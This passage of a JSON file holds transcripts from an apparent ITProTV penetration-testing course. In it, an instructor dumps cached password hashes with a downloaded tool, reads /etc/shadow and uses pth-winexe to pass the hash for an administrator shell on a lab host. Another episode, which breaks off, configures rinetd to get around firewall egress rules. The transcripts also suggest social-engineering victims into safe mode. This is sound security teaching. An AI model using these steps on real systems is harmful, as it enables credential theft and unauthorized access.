coach.\n\n164\n00:07:53.535 --> 00:08:02.749\n190.168.209.146/hedump.exe.\n\n165\n00:08:02.749 --> 00:08:07.445\nIt's trying to connect,\nI know I started my service.\n\n166\n00:08:07.445 --> 00:08:10.674\nSo why is this not happening?\n\n167\n00:08:10.674 --> 00:08:12.092\nYou know what it is?\n\n168\n00:08:12.092 --> 00:08:14.040\nI think I didn't reconnect\nto this network.\n\n169\n00:08:15.490 --> 00:08:17.220\nThat would be a problem.\n\n170\n00:08:17.220 --> 00:08:18.880\nYeah, there's my problem.\n\n171\n00:08:18.880 --> 00:08:20.815\nIt's the little things that kill you,\nladies and gentlemen.\n\n172\n00:08:20.815 --> 00:08:23.241\n&gt;&gt; [LAUGH]\n&gt;&gt; Go ahead and stop this.\n\n173\n00:08:25.913 --> 00:08:28.530\nIf I can, it's apparently\nnot possible in this world.\n\n174\n00:08:30.630 --> 00:08:32.137\nIt killed my Internet connection.\n\n175\n00:08:32.137 --> 00:08:33.599\nIt killed my network connection.\n\n176\n00:08:33.599 --> 00:08:37.040\nWorking in virtualization can\ndefinitely get a little weird.\n\n177\n00:08:37.040 --> 00:08:38.650\nSo let me just close that.\n\n178\n00:08:38.650 --> 00:08:39.970\nWe'll reconnect.\n\n179\n00:08:43.081 --> 00:08:44.470\nLog back in.\n\n180\n00:08:47.081 --> 00:08:49.629\nTotally forgot we had jumped\nout to the Internet to\n\n181\n00:08:49.629 --> 00:08:53.350\ncorrect that password on\nan online password corrector.\n\n182\n00:08:53.350 --> 00:08:56.380\nHere we go, let's try one more time,\nthere we go.\n\n183\n00:08:56.380 --> 00:08:57.230\nNow, it's downloading it.\n\n184\n00:08:57.230 --> 00:08:59.970\nAnd it just probably put that\nin the downloads folder.\n\n185\n00:08:59.970 --> 00:09:01.753\nSo, it's in progress.\n\n186\n00:09:01.753 --> 00:09:04.310\nSo continue that download, good sir.\n\n187\n00:09:04.310 --> 00:09:05.840\nI won't stop you.\n\n188\n00:09:05.840 --> 00:09:08.160\nThere we go, so we'll discard this one.\n\n189\n00:09:08.160 --> 00:09:11.320\nShoe me that in a folder, and there it is.\n\n190\n00:09:11.320 --> 00:09:14.650\nSo I will go ahead and close Chrome.\n\n191\n00:09:14.650 --> 00:09:17.800\nBring this up.\nI'm just gonna copy and\n\n192\n00:09:17.800 --> 00:09:20.040\npaste that into here.\n\n193\n00:09:23.500 --> 00:09:26.160\nAnd then,\nI'm just gonna run as administrator.\n\n194\n00:09:28.250 --> 00:09:30.050\nYes, I want to run that.\n\n195\n00:09:30.050 --> 00:09:30.700\nAway it goes.\n\n196\n00:09:30.700 --> 00:09:35.110\nYou'll notice it's generating some\noutputs, here come the files of goodness.\n\n197\n00:09:35.110 --> 00:09:39.565\nOne of them is going to be a log file,\nthat's this one right here.\n\n198\n00:09:39.565 --> 00:09:43.090\nAnd another one is going to be cache dump,\nand\n\n199\n00:09:43.090 --> 00:09:48.080\nthis is the actual dumped hash file,\nright?\n\n200\n00:09:48.080 --> 00:09:52.860\nSo if I open it up, there's all\nthe lovely passwords for all the lovely.\n\n201\n00:09:52.860 --> 00:09:55.670\nNow, the problem is that they are hashed,\nso\n\n202\n00:09:55.670 --> 00:09:58.140\nI've now got to run them\nthrough my password cracker.\n\n203\n00:09:58.140 --> 00:10:00.950\nBut that's how I grab them from here.\n\n204\n00:10:00.950 --> 00:10:05.960\nFrom here, I can just copy and\npaste that into, I can just literally\n\n205\n00:10:07.080 --> 00:10:12.230\ncopy and go over here and\npaste that into a file.\n\n206\n00:10:13.550 --> 00:10:17.082\nSo I can just say nano hashes dot text,\nand\n\n207\n00:10:17.082 --> 00:10:21.874\nthen right-click and paste.\n\n208\n00:10:21.874 --> 00:10:25.430\nThere I go, Ctrl+O.\n\n209\n00:10:25.430 --> 00:10:26.480\nCtrl+x.\n\n210\n00:10:26.480 --> 00:10:27.580\nI've got a file waiting for me.\n\n211\n00:10:27.580 --> 00:10:29.800\nNow all I gotta do is run it\nthrough my password crackers.\n\n212\n00:10:29.800 --> 00:10:32.490\nSo that is password grabbing.\n\n213\n00:10:32.490 --> 00:10:35.993\nI'm gonna grab it out of the,\nI didn't show you etc shadow.\n\n214\n00:10:35.993 --> 00:10:39.087\nI'll just cancel etc/shadow.\n\n215\n00:10:39.087 --> 00:10:43.980\nThere you go,\nthere's the encrypted hashes.\n\n216\n00:10:43.980 --> 00:10:46.780\nSo you just copy that to a file, and\n\n217\n00:10:46.780 --> 00:10:49.380\nthen run that file through\nyour password cracker.\n\n218\n00:10:51.110 --> 00:10:52.860\nAll right, where are we at here?\n\n219\n00:10:52.860 --> 00:10:55.780\nWe are on a very interesting topic.\n\n220\n00:10:55.780 --> 00:10:59.180\nSometimes, we've shown you all\nabout cracking these passwords,\n\n221\n00:10:59.180 --> 00:11:00.570\nrunning them through a cracker.\n\n222\n00:11:00.570 --> 00:11:04.250\nSometimes trying to get\nthe password value, what that is.\n\n223\n00:11:04.250 --> 00:11:08.110\nBut not every time do you actually\nneed to break the password.\n\n224\n00:11:09.260 --> 00:11:10.560\nThat makes sense.\n\n225\n00:11:10.560 --> 00:11:14.100\nYou have the hashed value of the password.\n\n226\n00:11:14.100 --> 00:11:17.798\nSometimes you can just spit\nthat to your end User and\n\n227\n00:11:17.798 --> 00:11:22.430\nit will accept it because\nthe hashes equal each other.\n\n228\n00:11:22.430 --> 00:11:28.670\nNow, I think this only works, there\nare some caveats to being able to do this.\n\n229\n00:11:28.670 --> 00:11:32.150\nAnd I wrote them down so that I don't\nforget any of them for you good people so\n\n230\n00:11:32.150 --> 00:11:34.080\nthat you don't go this isn't working, man.\n\n231\n00:11:34.080 --> 00:11:35.900\nI'm trying this and it's not working.\n\n232\n00:11:35.900 --> 00:11:41.460\nYes, if you don't understand where this\nworks, then it won't work, obviously.\n\n233\n00:11:41.460 --> 00:11:45.400\nSo the caveats are that this works\nagainst NTLM authentication.\n\n234\n00:11:46.460 --> 00:11:49.850\nAnd this is under, so\nWindows systems that use NTLM.\n\n235\n00:11:51.430 --> 00:11:54.470\nThings like NetBios or SMB, right?\n\n236\n00:11:54.470 --> 00:11:56.070\nIf you see SMB, it could work there.\n\n237\n00:11:57.250 --> 00:11:59.495\nLinux, it will work in Linus, or MacOS.\n\n238\n00:11:59.495 --> 00:12:01.628\nAnything that would run Samba,\n\n239\n00:12:01.628 --> 00:12:05.345\ncuz Samba is basically a hacked\nversion of SMB, right?\n\n240\n00:12:05.345 --> 00:12:07.350\nSo, there you go.\n\n241\n00:12:07.350 --> 00:12:11.280\nIt's using NTLM, or\nany service that is using NTLM.\n\n242\n00:12:11.280 --> 00:12:12.090\nSo look for SMB.\n\n243\n00:12:12.090 --> 00:12:17.420\nThere's a great SANS institute\npaper on this very topic.\n\n244\n00:12:17.420 --> 00:12:19.960\nIt's called Passing the Hash, and\n\n245\n00:12:19.960 --> 00:12:22.560\nI've linked it into our show notes so\nyou can just follow the link.\n\n246\n00:12:22.560 --> 00:12:25.850\nIt'll take you there, you can read\nthat paper, it's a great read.\n\n247\n00:12:25.850 --> 00:12:28.330\nA word on Windows 10.\n\n248\n00:12:28.330 --> 00:12:32.260\nWindows 10 isn't\nsusceptible to this per se.\n\n249\n00:12:33.300 --> 00:12:37.220\nYou have to kind of, what you have\nto do is boot it into safe mode.\n\n250\n00:12:37.220 --> 00:12:40.000\nOnce a Windows 10 machine\nis booted into safe mode,\n\n251\n00:12:40.000 --> 00:12:43.280\nthen you are able to perform this.\n\n252\n00:12:43.280 --> 00:12:46.270\nSo if you can social engineer someone into\nrebooting their system into safe mode,\n\n253\n00:12:46.270 --> 00:12:49.660\nor if you have some sort of limited access\nwhere you can get it to reboot into safe\n\n254\n00:12:49.660 --> 00:12:54.200\nmode, then you'll need to do that for\nWindows 10 environments.\n\n255\n00:12:54.200 --> 00:12:59.330\nI am running Window 7, obviously,\nso let's see how does this work.\n\n256\n00:12:59.330 --> 00:13:02.340\nWhat do you mean, Mr. Lowry, about this?\n\n257\n00:13:02.340 --> 00:13:03.570\nLet me cross this stuff down.\n\n258\n00:13:04.690 --> 00:13:05.950\nLog out here.\n\n259\n00:13:05.950 --> 00:13:06.450\nLog off.\n\n260\n00:13:07.850 --> 00:13:08.660\nJust get it out of our way.\n\n261\n00:13:08.660 --> 00:13:10.910\nLet me clear our screen.\n\n262\n00:13:12.130 --> 00:13:12.660\nClear our screen.\n\n263\n00:13:13.960 --> 00:13:15.790\nI like a clean slate here.\n\n264\n00:13:15.790 --> 00:13:18.067\nGet back into correct directory.\n\n265\n00:13:19.838 --> 00:13:25.850\nCT, there we go, cd attack,\nand password stuff.\n\n266\n00:13:25.850 --> 00:13:26.350\nThere we go.\n\n267\n00:13:28.970 --> 00:13:30.070\nSo how do we do this?\n\n268\n00:13:30.070 --> 00:13:34.610\nIt's called the PTH Tools,\npass the hash tool sets.\n\n269\n00:13:34.610 --> 00:13:36.840\nIf you have Kali Linux,\nit should be installed already.\n\n270\n00:13:36.840 --> 00:13:40.070\nIf not, Google Pass the Hash tools.\n\n271\n00:13:40.070 --> 00:13:41.810\nAnd I think it's a GitHub repository.\n\n272\n00:13:41.810 --> 00:13:43.080\nDid I write down where to get it?\n\n273\n00:13:43.080 --> 00:13:44.622\nNo, I didn't.\nSorry about that, guys.\n\n274\n00:13:44.622 --> 00:13:47.435\nBut Google's our friend,\nyou know how to use that.\n\n275\n00:13:47.435 --> 00:13:52.330\nAnd now, all we have to do is\nuse the win EXC P-A-T-H tool.\n\n276\n00:13:52.330 --> 00:13:54.780\nIt's pth-winexe.\n\n277\n00:13:54.780 --> 00:13:59.390\nOf course, the machine has to\nbe running the NTLM, right?\n\n278\n00:13:59.390 --> 00:14:01.290\nSo something like SMB.\n\n279\n00:14:01.290 --> 00:14:05.224\nOurs is, so let's see how that works,\nand see what it will do.\n\n280\n00:14:06.957 --> 00:14:11.626\nI go pth-winexe, just like that.\n\n281\n00:14:11.626 --> 00:14:12.250\n-u.\n\n282\n00:14:12.250 --> 00:14:17.400\nThen you give it a user account for\nu, right?\n\n283\n00:14:17.400 --> 00:14:19.120\nSo, we're gonna log in as administrator.\n\n284\n00:14:21.840 --> 00:14:22.986\nAdministrator, like that.\n\n285\n00:14:22.986 --> 00:14:28.680\nThen you want to give it the password, and\nyou separate the two using a percent sign.\n\n286\n00:14:28.680 --> 00:14:30.990\nSo you just put a percent there.\n\n287\n00:14:30.990 --> 00:14:36.210\nAnd you also have to\nform it in a certain way.\n\n288\n00:14:36.210 --> 00:14:43.650\nIf I've got this little thing here,\nwhich is called empty_LM.txt.\n\n289\n00:14:43.650 --> 00:14:48.810\nIf I cut that, cut empty,\nI've got the string.\n\n290\n00:14:48.810 --> 00:14:52.840\nAnd basically what this\nis is an empty LM hash,\n\n291\n00:14:52.840 --> 00:14:57.150\nbecause this tool requires\nan LM hash to be there.\n\n292\n00:14:57.150 --> 00:15:01.720\nAnd since there's not one, cuz we're\nusing NTLM, it shows that empty string.\n\n293\n00:15:01.720 --> 00:15:05.460\nSo if we looked at that two hash,\nso cat two hash,\n\n294\n00:15:05.460 --> 00:15:10.390\nyou see these right here\nwhere it says no password.\n\n295\n00:15:11.690 --> 00:15:15.728\nThat's because there's no, I'm sorry,\n\n296\n00:15:15.728 --> 00:15:19.760\nthere's no LM hash there, it's empty.\n\n297\n00:15:19.760 --> 00:15:21.390\nThey don't use that anymore.\n\n298\n00:15:21.390 --> 00:15:22.570\nThere's only NTLM.\n\n299\n00:15:22.570 --> 00:15:27.820\nSo we have to feed it one that has no\nvalue, and that's what this string is.\n\n300\n00:15:27.820 --> 00:15:31.875\nI've just Google searched that,\nempty LM hash value, and\n\n301\n00:15:31.875 --> 00:15:35.700\nwebsite after website was\navailable to give that to me.\n\n302\n00:15:35.700 --> 00:15:38.120\nSo, let's see here,\nI didn't have that, let's cat that.\n\n303\n00:15:38.120 --> 00:15:42.260\nLet me clear that out cuz that's\nlooking crazy, cat empty on hash.\n\n304\n00:15:42.260 --> 00:15:49.720\nSo you'll need that value, copy it out,\ncopy, paste it over there.\n\n305\n00:15:49.720 --> 00:15:52.650\nAnd then give it a colon.\n\n306\n00:15:52.650 --> 00:15:57.460\nAnd now we're gonna give it the actual\nNTLM hash of our administrator,\n\n307\n00:15:57.460 --> 00:16:00.920\nwhich we got when we copied and\npasted that.\n\n308\n00:16:00.920 --> 00:16:03.770\nSo I can say, [INAUDIBLE] hash cat 2Hash.\n\n309\n00:16:06.050 --> 00:16:09.320\nAnd here's administrator, well,\nat the time that it happens,\n\n310\n00:16:09.320 --> 00:16:12.280\nI'll take another user account,\ncuz they're all the same.\n\n311\n00:16:12.280 --> 00:16:14.270\nI made it all password1.\n\n312\n00:16:14.270 --> 00:16:16.170\nSo it doesn't matter which one I grab.\n\n313\n00:16:16.170 --> 00:16:19.601\nBut I would've grabbed administrator\nif that had been available.\n\n314\n00:16:19.601 --> 00:16:22.644\nCopy and then paste that value there.\n\n315\n00:16:25.000 --> 00:16:26.700\nAnd let's see here.\n\n316\n00:16:26.700 --> 00:16:29.906\nThen you do //.\n\n317\n00:16:31.576 --> 00:16:33.564\nI don't know if I'm gonna do ipcmd.\n\n318\n00:16:33.564 --> 00:16:35.031\nLet me see here.\n\n319\n00:16:35.031 --> 00:16:36.470\nI think I actually have to put the IP in.\n\n320\n00:16:36.470 --> 00:16:40.432\nI'm following my notes here.\n\n321\n00:16:40.432 --> 00:16:46.860\n192.168.219.200, and\nthen Cmd is the command prompt.\n\n322\n00:16:48.100 --> 00:16:49.710\nAnd there you go, look at that.\n\n323\n00:16:49.710 --> 00:16:54.240\nSo, I've passed the hash values\ninstead of a cracked password\n\n324\n00:16:54.240 --> 00:16:55.790\nto gain access to that system.\n\n325\n00:16:55.790 --> 00:16:58.630\nAnd as you can see, I can say who am I?\n\n326\n00:16:58.630 --> 00:17:01.090\nAnd I'm logged in as administrator.\n\n327\n00:17:01.090 --> 00:17:04.660\nI think it only works for\nthe administrator account as well.\n\n328\n00:17:04.660 --> 00:17:07.360\nCould be wrong on that, but\nif I'm remembering correctly,\n\n329\n00:17:07.360 --> 00:17:09.940\nsomething's telling me in my brain\nhey don't forget to tell them I think\n\n330\n00:17:09.940 --> 00:17:11.440\nthis only works for\nthe administrator account.\n\n331\n00:17:11.440 --> 00:17:13.680\nIf it doesn't, great, and\nyou can use any account.\n\n332\n00:17:13.680 --> 00:17:16.930\nBut I know for a fact it definitely works\nfor the administrator account just about\n\n333\n00:17:16.930 --> 00:17:19.300\nevery time,\nas long as you have those two values.\n\n334\n00:17:19.300 --> 00:17:22.500\nAnd that, my good friends,\nis passing the hash.\n\n335\n00:17:22.500 --> 00:17:23.920\nKind of dangerous if you think about it.\n\n336\n00:17:23.920 --> 00:17:25.100\nI didn't have to crack anything.\n\n337\n00:17:25.100 --> 00:17:29.110\nI just had to grab an encrypted value and\nslap it in there.\n\n338\n00:17:29.110 --> 00:17:31.350\nAnd let it go yeah, well that's right.\n\n339\n00:17:31.350 --> 00:17:35.170\n&gt;&gt; Yeah, that's the scary part is why\nbother cracking the password when I can\n\n340\n00:17:35.170 --> 00:17:36.970\njust use what you sent?\n\n341\n00:17:36.970 --> 00:17:39.000\nAll I need to do is get that hash value.\n\n342\n00:17:39.000 --> 00:17:40.340\nAlso notice what Daniel did there.\n\n343\n00:17:40.340 --> 00:17:43.470\nHe did what we call\na kind of a side channel.\n\n344\n00:17:43.470 --> 00:17:47.890\nI couldn't take that hash and\ngo to a log on screen and\n\n345\n00:17:47.890 --> 00:17:50.500\ntype in your username and\npaste the hash value in there.\n\n346\n00:17:50.500 --> 00:17:52.240\nYou might think well, why?\n\n347\n00:17:52.240 --> 00:17:55.520\nYou're telling me that the hash is getting\nsubmitted and compared to the database.\n\n348\n00:17:55.520 --> 00:17:59.490\nThat's not gonna work because whatever you\ntype in there, it's expecting plaintext.\n\n349\n00:17:59.490 --> 00:18:02.370\nAnd it's gonna run it through\nthe hashing algorithms either\n\n350\n00:18:02.370 --> 00:18:03.540\nLAN manager, NTLM or both.\n\n351\n00:18:03.540 --> 00:18:05.190\n&gt;&gt; It's kinda like rehash the hash.\n\n352\n00:18:05.190 --> 00:18:08.450\n&gt;&gt; Exactly, it'll rehash the hash, and\nit's no longer gonna match the hash value\n\n353\n00:18:08.450 --> 00:18:11.310\nthat's stored in the database,\nso it's not gonna work.\n\n354\n00:18:11.310 --> 00:18:14.440\nSo you saw him go through a side channel\nand say look, I'm not gonna use that.\n\n355\n00:18:14.440 --> 00:18:15.580\nI'm just gonna submit this.\n\n356\n00:18:15.580 --> 00:18:20.230\nHere it is, here's the user name, here's\nthe hashed password, please take that.\n\n357\n00:18:20.230 --> 00:18:21.160\nAnd that's what works.\n\n358\n00:18:21.160 --> 00:18:22.520\n&gt;&gt; That's it.\n&gt;&gt; Scary stuff.\n\n359\n00:18:22.520 --> 00:18:25.000\n&gt;&gt; Well, Mike, that's passing the hash,\nthat's password grabbing,\n\n360\n00:18:25.000 --> 00:18:27.030\nthat's brute force, dictionary tags,\n\n361\n00:18:27.030 --> 00:18:31.360\npasswords all enrolled in one if you\ncount episode part one of this as well.\n\n362\n00:18:31.360 --> 00:18:33.310\nAnd that's all I got when\nit comes to passwords.\n\n363\n00:18:33.310 --> 00:18:37.660\nIt can be daunting task, a lot of sitting\naround, twirling our thumbs, waiting for\n\n364\n00:18:37.660 --> 00:18:39.320\npasswords to get cracked.\n\n365\n00:18:39.320 --> 00:18:41.870\nBut that's the name of the game ladies and\ngentlemen, if you wanna get in,\n\n366\n00:18:41.870 --> 00:18:43.160\npatience does pay.\n\n367\n00:18:43.160 --> 00:18:46.380\n&gt;&gt; It definitely is, and Daniel we thank\nyou greatly for all that information.\n\n368\n00:18:46.380 --> 00:18:49.370\nFantastic demonstrations,\nfantastic explanations.\n\n369\n00:18:49.370 --> 00:18:51.040\nSo again, thank you for that.\n\n370\n00:18:51.040 --> 00:18:51.540\n&gt;&gt; No problem.\n\n371\n00:18:51.540 --> 00:18:53.850\n&gt;&gt; We hope everybody out there\nenjoyed watching this one.\n\n372\n00:18:53.850 --> 00:18:56.620\nSigning off for ITProTV,\nI've been your host Mike Rodrick.\n\n373\n00:18:56.620 --> 00:18:57.680\n&gt;&gt; And I'm Daniel Lowrie.\n\n374\n00:18:57.680 --> 00:19:00.001\n&gt;&gt; And we'll see you next time.\n\n375\n00:19:00.001 --> 00:19:05.976\n[MUSIC]\n\n376\n00:19:05.976 --> 00:19:08.855\n&gt;&gt; Thank you for watching ITPro.TV.\n\n",
          "vimeoId": "202941973"
        },
        {
          "description": "In this episode, Dan and Mike discuss different types of port redirection. They look at port forwarding and SSH tunneling. They also demonstrate remote port forwarding with SSH.",
          "length": "1217",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-10-1-port_redirection-020317-PGM.00_20_03_19.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-10-1-port_redirection-020317-PGM.00_20_03_19.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-10-1-port_redirection-020317-PGM.00_20_03_19.Still001-sm.jpg",
          "title": "Port Redirection",
          "transcript": "WEBVTT\n\n1\n00:00:00.412 --> 00:00:01.960\nWelcome to ITProTV,\nI'm your host Don Pezet.\n\n2\n00:00:01.960 --> 00:00:08.310\n[CROSSTALK]\n\n3\n00:00:08.310 --> 00:00:12.007\n&gt;&gt; You're watching ITProTV.\n\n4\n00:00:12.007 --> 00:00:15.350\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n5\n00:00:15.350 --> 00:00:19.010\nI'm your host Mike Rodrick, and\ntoday we're doing penetration testing.\n\n6\n00:00:19.010 --> 00:00:23.700\nIn this episode we're gonna be\nlooking at port redirection.\n\n7\n00:00:23.700 --> 00:00:26.610\nAnd here to tell us all about it is Mr.\nDaniel Lowrie.\n\n8\n00:00:26.610 --> 00:00:27.470\nWelcome back, Daniel.\n\n9\n00:00:27.470 --> 00:00:28.740\n&gt;&gt; Man, I'm so glad to be back.\n\n10\n00:00:28.740 --> 00:00:30.990\nYes, we are here for\nport redirection today.\n\n11\n00:00:30.990 --> 00:00:32.920\nThis is gonna be a lot of fun.\n\n12\n00:00:32.920 --> 00:00:37.120\nIf you like brain twisters and\nteasers and things of that nature,\n\n13\n00:00:37.120 --> 00:00:40.680\nyou're gonna really love this because\nthat's basically what this boils down to.\n\n14\n00:00:40.680 --> 00:00:43.540\nThis is one of the things that makes your\nhead hurt when you're looking at it and\n\n15\n00:00:43.540 --> 00:00:45.680\ntrying to understand what's going on.\n\n16\n00:00:45.680 --> 00:00:49.770\nBut it's a really cool technique for\nus to be able to [COUGH],\n\n17\n00:00:49.770 --> 00:00:53.570\nexcuse me,\nbypass firewall restrictions, and\n\n18\n00:00:53.570 --> 00:00:58.330\nthings of that nature, which can be\nhelpful when we're attacking systems.\n\n19\n00:00:58.330 --> 00:01:00.870\nSo, that being in mind,\nlet's just jump right into the fray,\n\n20\n00:01:00.870 --> 00:01:02.840\nand let's start learning\nabout port redirection.\n\n21\n00:01:02.840 --> 00:01:08.460\nWhat we're doing is basically we're\ngonna if one port is blocked right,\n\n22\n00:01:08.460 --> 00:01:11.860\nbut another port is open,\nwell I wanna use the open port and\n\n23\n00:01:11.860 --> 00:01:14.270\nredirect traffic that normally\nwould go out of the blocked port.\n\n24\n00:01:14.270 --> 00:01:16.850\nThat's kind of the idea, right.\n\n25\n00:01:16.850 --> 00:01:19.880\nSo maybe I've got a web server and\n\n26\n00:01:19.880 --> 00:01:24.140\nit's allowing ingress into port 80 right,\nwith the firewall.\n\n27\n00:01:24.140 --> 00:01:26.280\nBut it's not allowing egress\nout of any other port but\n\n28\n00:01:26.280 --> 00:01:29.340\n80 as well cuz it's a web server.\n\n29\n00:01:29.340 --> 00:01:32.430\nWhat does it need with SSH or\nanything of that nature?\n\n30\n00:01:32.430 --> 00:01:36.420\nOr maybe it's just running SSH in 80 so\nsomeone can have remote access to it.\n\n31\n00:01:36.420 --> 00:01:39.310\nAnd it's a web server,\nbasic, nothing else.\n\n32\n00:01:39.310 --> 00:01:40.620\nThat's all you get.\n\n33\n00:01:40.620 --> 00:01:43.080\nThat's actually a very common\nway to set a firewall up,\n\n34\n00:01:43.080 --> 00:01:44.360\nespecially with the egress rules.\n\n35\n00:01:44.360 --> 00:01:48.560\nYou don't want people getting in and\nthen coming back out or going out and\n\n36\n00:01:48.560 --> 00:01:51.660\nservices happens and companies a lot\nthey don't want you surfing Facebook or\n\n37\n00:01:51.660 --> 00:01:52.560\nthings of that nature.\n\n38\n00:01:52.560 --> 00:01:55.730\nSo they just block those ports or\nthey blacklist them.\n\n39\n00:01:55.730 --> 00:02:00.857\nThey don't necessarily block a port,\nthey block the site using a proxy server.\n\n40\n00:02:00.857 --> 00:02:01.711\n&gt;&gt; Proxies yep.\n\n41\n00:02:01.711 --> 00:02:03.470\n&gt;&gt; But the idea is the same kind of thing.\n\n42\n00:02:03.470 --> 00:02:06.900\nYou're blocking ports instead\nof blocking sites okay?\n\n43\n00:02:08.000 --> 00:02:10.370\nAnd so what if I wanna be\nable to get to that site?\n\n44\n00:02:10.370 --> 00:02:12.590\nWhat they're not allowing\nme to web surf at all?\n\n45\n00:02:12.590 --> 00:02:15.580\nAnd port 80 inside of my company\nis keeping me out, right?\n\n46\n00:02:15.580 --> 00:02:17.340\nIts blocked off, I can't surf the web.\n\n47\n00:02:18.650 --> 00:02:21.950\nI can set up a machine at home and\n\n48\n00:02:21.950 --> 00:02:26.910\nuse it as a proxy, go out through\nany open port that is allowed,\n\n49\n00:02:26.910 --> 00:02:29.810\nproxy from there,\nhave it return through that open port.\n\n50\n00:02:29.810 --> 00:02:33.410\nSo that's port redirection,\nwe're gonna redirect through those ports.\n\n51\n00:02:33.410 --> 00:02:36.100\nAnd yeah, if that was like\nwhat are you talking about?\n\n52\n00:02:36.100 --> 00:02:39.433\nHopefully it'll make a little more sense,\nI have diagrams and everything.\n\n53\n00:02:39.433 --> 00:02:43.320\n[LAUGH] We're gonna draw pictures,\nMike's gonna have some puppets.\n\n54\n00:02:43.320 --> 00:02:45.265\nIt's gonna be a lot of good times.\n\n55\n00:02:45.265 --> 00:02:48.640\n[LAUGH] So hopefully at the end of it,\nyou'll understand a little better.\n\n56\n00:02:48.640 --> 00:02:50.150\nAll right so where do we wanna start?\n\n57\n00:02:50.150 --> 00:02:52.020\nLet's start with port forwarding.\n\n58\n00:02:53.090 --> 00:02:58.034\nAgain used to bypass restrictions by\nforwarding data through your proxy\n\n59\n00:02:58.034 --> 00:02:58.770\nservers.\n\n60\n00:02:58.770 --> 00:03:00.660\nSo that's the most simple.\n\n61\n00:03:00.660 --> 00:03:03.980\nLet's take a look at my diagram here.\n\n62\n00:03:03.980 --> 00:03:06.739\nSo this should give you a better\nidea of what is happening.\n\n63\n00:03:08.430 --> 00:03:13.211\nOver here we have a client machine\nwhich is behind a firewall, okay.\n\n64\n00:03:13.211 --> 00:03:19.140\nAnd over here we have basically\nthe Internet, it's my pretty little cloud.\n\n65\n00:03:19.140 --> 00:03:22.920\nAnd there's my proxy machine that I\nset up maybe at home or wherever.\n\n66\n00:03:24.140 --> 00:03:27.830\nAnd then I've got this cool web server\nthat I love to peruse to my favorite\n\n67\n00:03:27.830 --> 00:03:32.980\nwebsite maybe it's ITProTV or\nDevProTV, something cool.\n\n68\n00:03:32.980 --> 00:03:34.045\nYeah, something like that.\n\n69\n00:03:34.045 --> 00:03:35.063\n&gt;&gt; Matchbox.com.\n\n70\n00:03:35.063 --> 00:03:37.181\n&gt;&gt; Yeah, definitely matchbox.com.\n\n71\n00:03:37.181 --> 00:03:39.460\nThat is a cool site.\n\n72\n00:03:39.460 --> 00:03:41.350\nBut I can't get there from\nwork because what's happening?\n\n73\n00:03:41.350 --> 00:03:45.850\nFirewall is blocking outbound\nweb requests, ports 80 and 443.\n\n74\n00:03:45.850 --> 00:03:51.410\nI can't surf the web because ports 80 and\n443 do not allow me to go out.\n\n75\n00:03:51.410 --> 00:03:52.770\nI can't go out of those ports.\n\n76\n00:03:53.820 --> 00:03:57.300\nBut it's not blocking any other ports,\nright?\n\n77\n00:03:57.300 --> 00:04:01.690\nSo what I do is I set my proxy machine\nto basically listen on port 2222.\n\n78\n00:04:01.690 --> 00:04:06.176\nI use a service to set all this up.\n\n79\n00:04:06.176 --> 00:04:08.708\nAnd then I just attack on 2222 and\n\n80\n00:04:08.708 --> 00:04:13.527\nI use some command line Tom Foolerry and\nwe get out, it does the work for\n\n81\n00:04:13.527 --> 00:04:17.706\nme, brings it back and\nthen sends it back over the same port.\n\n82\n00:04:17.706 --> 00:04:19.778\nThat's in essence what's gonna happen.\n\n83\n00:04:19.778 --> 00:04:21.419\nSo what do we need to be able to do this?\n\n84\n00:04:21.419 --> 00:04:23.331\nWe need a proxy server service.\n\n85\n00:04:23.331 --> 00:04:27.953\nThe one I have installed\nin my Kali Linux is Rinetd,\n\n86\n00:04:27.953 --> 00:04:30.973\nD- R-I-N-E-T-D, right?\n\n87\n00:04:30.973 --> 00:04:33.810\nI think that's it or how it's spelled.\n\n88\n00:04:33.810 --> 00:04:35.622\nYeah, R-I-N-E-T-D.\n\n89\n00:04:35.622 --> 00:04:40.746\nAnd to set it up, you go to\nthe rinettd.conf file which is an etsy,\n\n90\n00:04:40.746 --> 00:04:42.310\nmake a few changes.\n\n91\n00:04:42.310 --> 00:04:45.226\nLet's take a look at that,\ngo back over to Kali.\n\n92\n00:04:45.226 --> 00:04:53.690\nWe will cat/etsy/rynettd.conf and\n\n93\n00:04:53.690 --> 00:04:56.720\nthere is the configuration file and\nhere's what I did.\n\n94\n00:04:56.720 --> 00:05:01.279\nYou get these columns where\nyou need to set some data up,\n\n95\n00:05:01.279 --> 00:05:07.400\nthat's basically giving you the structure\nand here is my server, right.\n\n96\n00:05:07.400 --> 00:05:09.720\nSo that's my Kali box.\n\n97\n00:05:09.720 --> 00:05:12.730\nHere's the port that I want to bind it to,\nand\n\n98\n00:05:12.730 --> 00:05:15.040\nthen here's the address\nthat's going to connect.\n\n99\n00:05:15.040 --> 00:05:17.583\nI actually need to change that,\nbecause that is different now.\n\n100\n00:05:17.583 --> 00:05:20.266\nSo let's do that,\n\n101\n00:05:20.266 --> 00:05:25.978\nlet's say nano /etc/rinetd.conf.\n\n102\n00:05:25.978 --> 00:05:31.305\nAnd I'm gonna go in here and\nI'm gonna change that to the IP\n\n103\n00:05:31.305 --> 00:05:36.980\naddress of the client machines\nthat's behind the firewall.\n\n104\n00:05:38.900 --> 00:05:42.750\nSo there's no longer 158, I statistically\nset it to 200 cuz it kept changing on me.\n\n105\n00:05:42.750 --> 00:05:46.040\nAnd then the connection\nport is gonna be 80, right.\n\n106\n00:05:46.040 --> 00:05:49.120\nThat's what you need there because\nI wanna get to port 80, ultimately.\n\n107\n00:05:50.150 --> 00:05:55.649\nSo save that, control X, and now,\nlet's see here, we added that line,\n\n108\n00:05:55.649 --> 00:06:00.540\nthe proxy is ready to go,\nmake sure you start the service.\n\n109\n00:06:00.540 --> 00:06:02.658\nSo I can do it the old fashion way.\n\n110\n00:06:02.658 --> 00:06:05.239\nService, rinetd, is that it?\n\n111\n00:06:05.239 --> 00:06:10.496\nYeah, rinetd,\nI can never get this straight in my head.\n\n112\n00:06:10.496 --> 00:06:13.050\nAnd then,\nI'll just restart just to make sure.\n\n113\n00:06:13.050 --> 00:06:16.060\nIf it was already started,\nit's been restarted, so there you go.\n\n114\n00:06:16.060 --> 00:06:18.240\nService is started, it's ready to go.\n\n115\n00:06:18.240 --> 00:06:21.290\nThe configuration 